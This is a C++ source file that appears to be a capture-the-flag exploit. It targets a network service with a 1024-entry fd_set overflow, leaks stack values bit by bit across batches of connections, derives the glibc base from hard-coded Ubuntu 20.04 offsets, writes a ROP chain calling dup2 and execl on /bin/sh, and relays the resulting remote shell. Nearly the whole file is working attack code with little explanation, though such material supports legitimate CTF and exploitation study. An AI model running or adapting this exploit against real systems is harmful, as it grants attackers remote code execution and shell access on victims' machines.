/*
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     https://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
// g++ expl.cc -std=c++17 -O2 -static -o expl

#include <array>
#include <vector>
#include <fcntl.h>
#include <iostream>

#include <err.h>

#include <string.h>

#include <poll.h>

#include <unistd.h>

#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <arpa/inet.h>

#include <sys/time.h>

#include <unordered_map>

in_addr_t ip;
int port;

int connect_with(in_addr_t ip, int port, int bufsize = 1024) {
  int fd = socket(AF_INET, SOCK_STREAM, 0);
  if (fd < 0) {
    err(1, "socket");
  }
  if (setsockopt(fd, SOL_SOCKET, SO_RCVBUF, &bufsize, sizeof(int)) < 0) {
    err(1, "setsockopt");
  }
  sockaddr_in addr;
  addr.sin_family = AF_INET;
  addr.sin_addr.s_addr = ip;
  addr.sin_port = htons(port);
  if (connect(fd, reinterpret_cast<const sockaddr*>(&addr), sizeof(addr)) != 0) {
    err(1, "connect");
  }
  return fd;
}

std::string read_until(int fd, const std::string& suffix) {
  std::string res;
  while (res.size() < suffix.size() || res.compare(res.size()-suffix.size(), suffix.size(), suffix) != 0) {
    char c;
    ssize_t r = read(fd, &c, 1);
    if (r == 0) {
      std::cout << "read 0" << std::endl;
      return res;
    }
    if (r != 1) {
      err(1, "read");
    }
    res += c;
  }
  return res;
}

void send_str(int fd, const std::string& str) {
  for (size_t sent = 0; sent < str.size();) {
    ssize_t w = write(fd, &str[sent], str.size() - sent);
    if (w <= 0) {
      err(1, "write");
    }
    sent += w;
  }
}

int get_conn_id(int fd) {
  send_str(fd, "\n");
  read_until(fd, "[");
  std::string resp = read_until(fd, "]");
  read_until(fd, "\n\n");
  if (resp.size() < 1) {
    errx(1, "short resp: %s", resp.c_str());
  }
  resp = resp.substr(0, resp.size()-1);
  return std::stoi(resp);
}

std::vector<std::string> read_responses_with_timeout(const std::vector<int>& fds, int timeout_ms) {
  struct timeval deadline_ts;
  gettimeofday(&deadline_ts, nullptr);
  deadline_ts.tv_usec += (timeout_ms % 1000) * 1000;
  if (deadline_ts.tv_usec > 1000000) {
    deadline_ts.tv_usec -= 1000000;
    deadline_ts.tv_sec += 1;
  }
  deadline_ts.tv_sec += timeout_ms / 1000;
  std::vector<pollfd> pollfds;
  pollfds.reserve(fds.size());
  for (int fd : fds) {
    pollfds.push_back({
      .fd = fd,
      .events = POLLIN,
    });
  }
  std::vector<std::string> resp(pollfds.size());
  for (;;) {
    struct timeval now_ts;
    gettimeofday(&now_ts, nullptr);
    if (deadline_ts.tv_usec < now_ts.tv_usec) {
      now_ts.tv_sec += 1;
      now_ts.tv_usec = 1000000 - now_ts.tv_usec + deadline_ts.tv_usec;
    } else {
      now_ts.tv_usec = deadline_ts.tv_usec - now_ts.tv_usec;
    }
    if (deadline_ts.tv_sec < now_ts.tv_sec) {
      break;
    } else {
      now_ts.tv_sec = deadline_ts.tv_sec - now_ts.tv_sec;
    }
    int timeout = now_ts.tv_sec * 1000 + now_ts.tv_usec / 1000;
    if (timeout < 0) {
      break;
    }
    int ret = poll(&pollfds[0], pollfds.size(), timeout);
    if (ret < 0) {
      if (errno != EINTR) {
        err(1, "poll");
      }
    } else if (ret > 0) {
      for (size_t i = 0; i < pollfds.size(); ++i) {
        if (pollfds[i].revents & POLLIN) {
          char buf[100];
          int r = read(pollfds[i].fd, buf, sizeof(buf));
          if (r < 0) {
            if (errno != EAGAIN && errno != EWOULDBLOCK) {
              err(1, "read");
            }
          } else if (r > 0) {
            resp[i].append(buf, r);
          }
        }
      }
    }
  }
  return resp;
}

std::vector<int> connect_batch(int size) {
  std::vector<int> rv;
  for (int i = 0; i < size; ++i) {
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) {
      err(1, "socket");
    }
    if (fcntl(fd, F_SETFL, O_NONBLOCK) != 0) {
      err(1, "fcntl");
    }
    rv.push_back(fd);
  }
  sockaddr_in addr;
  addr.sin_family = AF_INET;
  addr.sin_addr.s_addr = ip;
  addr.sin_port = htons(port);
  std::vector<pollfd> pollfds;
  pollfds.reserve(size);
  int connected = 0;
  for (int fd : rv) {
    if (connect(fd, reinterpret_cast<const sockaddr*>(&addr), sizeof(addr)) != 0 && errno != EINPROGRESS) {
      err(1, "connect");
    }
    pollfds.push_back({
      .fd = fd,
      .events = POLLOUT,
    });
  }
  while (connected < size) {
    int ret = poll(&pollfds[0], pollfds.size(), -1);
    if (ret > 0) {
      for (pollfd& st : pollfds) {
        if (st.events == POLLOUT && st.revents == POLLOUT) {
          st.events = 0;
          ++connected;
        }
      }
    }
  }
  return rv;
}

std::vector<bool> read_bits(int base, int n) {
  constexpr int timeout_ms = 500;
  std::vector<int> conns = connect_batch(n);
  std::vector<std::string> resps = read_responses_with_timeout(conns, timeout_ms);
  std::vector<bool> rv(n);
  for (const std::string& resp : resps) {
    auto open_bracket = resp.find('[');
    if (open_bracket != std::string::npos) {
      int id = std::stoi(resp.substr(open_bracket+1));
      rv[id - base] = true;
    }
  }
  return rv;
}

std::vector<bool> read_bits_and_close(int base, int n) {
  constexpr int timeout_ms = 500;
  std::vector<int> conns = connect_batch(n);
  std::vector<int> sorted_conns(conns.size());
  std::vector<std::string> resps = read_responses_with_timeout(conns, timeout_ms);
  std::vector<bool> rv(n);
  for (size_t i = 0; i < conns.size(); ++i) {
    if (fcntl(conns[i], F_SETFL, 0) != 0) {
      err(1, "fcntl");
    }
    auto open_bracket = resps[i].find('[');
    if (open_bracket != std::string::npos) {
      int id = std::stoi(resps[i].substr(open_bracket+1));
      rv[id - base] = true;
      sorted_conns[id - base] = conns[i];
    } else {
      int id = get_conn_id(conns[i]);
      sorted_conns[id - base] = conns[i];
    }
  }
  while (!sorted_conns.empty()) {
    int fd = sorted_conns.back();
    sorted_conns.pop_back();
    shutdown(fd, SHUT_RDWR);
    usleep(1000);
    close(fd);
  }
  usleep(1000);
  return rv;
}

void connect_until(int id) {
  int cid;
  do {
    int fd = connect_with(ip, port);
    cid = get_conn_id(fd);
  } while (cid != id);
}

uint64_t bits_to_u64(std::vector<bool> bits) {
  uint64_t rv = 0;
  for (int bit = 0; bit < 64; ++bit) {
    rv |= (static_cast<uint64_t>(bits[bit]) << bit);
  }
  return rv;
}

uint64_t read_u64(int base) {
  return bits_to_u64(read_bits(base, 64));
}

uint64_t read_u64_and_close(int base) {
  return bits_to_u64(read_bits_and_close(base, 64));
}

char read_with_timeout(int fd, int timeout_millis) {
  if (fcntl(fd, F_SETFL, O_NONBLOCK) != 0) {
    err(1, "fcntl");
  }
  char c = '\0';
  struct timeval start_ts, cur_ts;
  gettimeofday(&start_ts, nullptr);
  for (;;) {
    gettimeofday(&cur_ts, nullptr);
    int elapsed = (cur_ts.tv_sec - start_ts.tv_sec) * 1000 + (cur_ts.tv_usec - start_ts.tv_usec) / 1000;
    if (elapsed > timeout_millis) {
      break;
    }
    ssize_t r = read(fd, &c, 1);
    if (r == 1) {
      break;
    }
    if (r < 0 && (errno != EWOULDBLOCK || errno != EAGAIN)) {
      err(1, "read");
    }
  }
  if (fcntl(fd, F_SETFL, 0) != 0) {
    err(1, "fcntl");
  }
  return c;
}

void write_u64(uint64_t value) {
  int fd = connect_with(ip, port);
  bool first_bit = read_with_timeout(fd, 1000) != '\0';
  if (first_bit && (value & 1) == 0) {
    static std::string filler = std::string(1024 * 1024, 'A') + '\n';
    send_str(fd, filler);
  }
  std::vector<int> fds;
  fds.push_back(fd);
  for (int i = 1; i < 64; ++i) {
    fds.push_back(connect_with(ip, port));
  }
  for (int i = 0; i < 8; ++i) {
    uint8_t byte = (value >> (8*i)) & 0xff;
    for (int bit = 0; bit < 8; ++bit) {
      if (byte & (1 << bit)) {
        send_str(fds[i*8+bit], "\n");
      }
    }
  }
}

struct ROPOffsets {
  uint64_t base;
  uint64_t bin_sh_str;
  uint64_t dup2;
  uint64_t execl;
  uint64_t pop_rdi;
  uint64_t pop_rsi;
};

// --------------- ADJUST THERE FOR YOUR LIBC ----------
constexpr char libc_ver[] = "ubuntu-20.04-glibc-2.31";
std::unordered_map<std::string, ROPOffsets> libc_offsets{
 {"ubuntu-20.04-glibc-2.31", ROPOffsets{
   .base = 0x270b3,
   .bin_sh_str = 0x1b75aa,
   .dup2 = 0x1118a0,
   .execl = 0xe64f0,
   .pop_rdi = 0x26b72,
   .pop_rsi = 0x27529,
 }},
};

std::vector<uint64_t> prepare_rop(uint64_t main_ret, int first_id) {
  const ROPOffsets& offsets = libc_offsets[libc_ver];
  uint64_t libc_base = main_ret - offsets.base;
  uint64_t libc_bin_sh_str = libc_base + offsets.bin_sh_str;
  uint64_t libc_dup2 = libc_base + offsets.dup2;
  uint64_t libc_execl = libc_base + offsets.execl;
  // pop rdi; ret
  uint64_t pop_rdi = libc_base + offsets.pop_rdi;
  // pop rsi; ret
  uint64_t pop_rsi = libc_base + offsets.pop_rsi;

  if ((libc_base & 0xfff) != 0) {
    std::cout << "Something is wrong with the leaked return address" << std::endl;
    errx(1, "wrong libc");
  }

  std::cout << std::hex << "Libc base: 0x" << libc_base << std::endl;

  uint64_t rop[] = {
    pop_rdi,
    (uint64_t)first_id,
    pop_rsi,
    0,
    libc_dup2,
    pop_rdi,
    libc_bin_sh_str,
    libc_execl,
  };
  return {std::begin(rop), std::end(rop)};
}

// Should be larger than CPU cache size
constexpr int kInitialFillSize = 8 * 1024 * 1024; // 12 MiB
constexpr int kDelayFillSize = 128 * 64; // ~1.5 KiB to fill whole MSS

// Change this if the stack layout of main changes in the challenge binary
constexpr int writefd_to_ret_addr_distance = 0xc8;


int main(int argc, char* argv[]) {
  if (argc >= 2) {
    ip = inet_addr(argv[1]);
    port = atoi(argv[2]);
  } else {
    ip = inet_addr("127.0.0.1");
    port = atoi("21337");
  }
  const int first_conn_fd = connect_with(ip, port);
  const int first_id = get_conn_id(first_conn_fd);

  const int fdset_size = 1024;
  const int batch_size = 64;
  const int target = (writefd_to_ret_addr_distance - (fdset_size / 8)) / 8 + 1;

  std::cout << "Stuffing first conn..." << std::endl;
  send_str(first_conn_fd, std::string(kInitialFillSize, 'A'));

  std::cout << "Creating initial connections..." << std::endl;
  connect_until(fdset_size - 1);

  std::cout << "Reading the stack..." << std::endl;
  int base = fdset_size;
  for (int i = 0; i < target - 1; i++) {
    send_str(first_conn_fd, std::string(kDelayFillSize, 'A'));
    usleep(100);
    std::cout << i << ": " << std::hex << read_u64(base) << std::endl;
    base += 64;
  }

  send_str(first_conn_fd, std::string(kDelayFillSize, 'A'));
  usleep(100);
  uint64_t main_ret = read_u64_and_close(base);

  std::cout << std::hex << "Return address of main: 0x" << main_ret << std::endl;

  auto rop = prepare_rop(main_ret, first_id);

  for (uint64_t word : rop) {
    std::cout << "Writing 0x" << std::hex << word << std::endl;
    write_u64(word);
  }

  send_str(first_conn_fd, "\n");
  read_until(first_conn_fd, "\n");
  usleep(100000);

  std::cout << "Done. Getting shell..." << std::endl;
  send_str(first_conn_fd, "exit\n");
  usleep(100000);
  send_str(first_conn_fd, "exec >&4 2>&1\n");

  std::array<pollfd, 2> pollfds;
  pollfds[0].fd = first_conn_fd;
  pollfds[0].events = POLLIN;
  pollfds[1].fd = 0;
  pollfds[1].events = POLLIN;

  for (;;) {
    int ret = poll(&pollfds[0], pollfds.size(), -1);
    if (ret < 0) {
      if (errno != EINTR) {
        err(1, "poll");
      }
    } else if (ret > 0) {
      for (size_t i = 0; i < pollfds.size(); ++i) {
        if (pollfds[i].revents & POLLIN) {
          char buf[100];
          int r = read(pollfds[i].fd, buf, sizeof(buf));
          if (r < 0) {
            if (errno != EAGAIN && errno != EWOULDBLOCK) {
              err(1, "read");
            }
          } else if (r > 0) {
            if (pollfds[i].fd == 0) {
              send_str(first_conn_fd, std::string(buf, r));
            } else {
              write(1, buf, r);
            }
          }
          if (r == 0 && pollfds[i].fd != 0) {
            std::cerr << "Disconnected" << std::endl;
            return 0;
          }
        }
      }
    }
  }

  return 0;
}
